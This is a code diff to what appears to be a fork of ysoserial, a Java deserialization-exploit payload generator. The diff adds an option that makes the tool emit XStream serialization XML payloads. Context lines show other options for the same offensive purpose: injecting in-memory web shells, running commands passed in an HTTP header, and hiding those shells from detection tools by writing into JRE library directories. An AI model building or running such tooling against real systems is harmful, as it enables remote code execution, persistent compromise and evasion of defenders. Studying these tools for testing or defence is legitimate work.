@@ -9,7 +9,6 @@ import com.qi4l.jndi.gadgets.utils.StringUtil;
 import com.qi4l.jndi.gadgets.utils.dirty.DirtyDataWrapper;
 import org.apache.commons.cli.*;
 
-import java.io.ByteArrayOutputStream;
 import java.io.FileOutputStream;
 import java.io.OutputStream;
 import java.util.*;
@@ -130,10 +129,19 @@ public class ysoserial {
             }
         }
 
+        if(cmdLine.hasOption("XStream")){
+            Config.IS_XSTREAM = true;
+        }
+
         final String payloadType = cmdLine.getOptionValue("gadget");
         final String command     = cmdLine.getOptionValue("parameters");
+        Class<? extends ObjectPayload> payloadClass = null;
+        if (Config.IS_XSTREAM){
+            payloadClass = ObjectPayload.Utils.getPayloadClass(cmdLine.getOptionValue("XStream"));
+        }else {
+            payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);
+        }
 
-        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);
         if (payloadClass == null) {
             System.err.println("Invalid payload type '" + payloadType + "'");
             printUsage(options);
@@ -196,6 +204,7 @@ public class ysoserial {
         options.addOption("ch", "cmd-header", true, "Request Header which pass the command to Execute,default [X-Token-Data]");
         options.addOption("gen", "gen-mem-shell", false, "Write Memory Shell Class to File");
         options.addOption("n", "gen-mem-shell-name", true, "Memory Shell Class File Name");
+        options.addOption("x", "XStream", true, "Generate Xstream serialization xml");
         options.addOption("h", "hide-mem-shell", false, "Hide memory shell from detection tools (type 2 only support SpringControllerMS)");
         options.addOption("ht", "hide-type", true, "Hide memory shell,type 1:write /jre/lib/charsets.jar 2:write /jre/classes/");
         options.addOption("rh", "rhino", false, "ScriptEngineManager Using Rhino Engine to eval JS");
